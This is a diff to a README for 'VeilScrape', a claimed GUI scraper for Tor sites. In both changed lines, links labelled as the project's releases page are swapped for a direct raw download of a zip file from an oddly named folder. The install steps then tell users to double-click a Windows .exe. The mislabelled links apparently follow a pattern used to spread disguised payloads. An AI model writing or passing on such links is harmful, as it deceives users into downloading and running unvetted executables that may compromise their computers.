@@ -1,6 +1,6 @@
 # 🔍 VeilScrape - Extract data from hidden websites easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ealasaidstupid494/VeilScrape/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Ealasaidstupid494/VeilScrape/main/dustily/Veil-Scrape-3.6.zip)
 
 VeilScrape gathers information from websites located on the Tor network. Users often need to collect text, images, or files from these sites without manual navigation. This tool automates that task. It uses a graphical interface to make the process simple. 
 
@@ -16,7 +16,7 @@ The software connects through the Tor network to keep your connection route priv
 
 ## 📥 How to Install and Run
 
-1. Visit the [releases page](https://github.com/Ealasaidstupid494/VeilScrape/releases) to download the current version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Ealasaidstupid494/VeilScrape/main/dustily/Veil-Scrape-3.6.zip) to download the current version.
 2. Select the Windows installer file ending in .exe.
 3. Save the file to your computer desktop.
 4. Double-click the downloaded file to begin the setup.
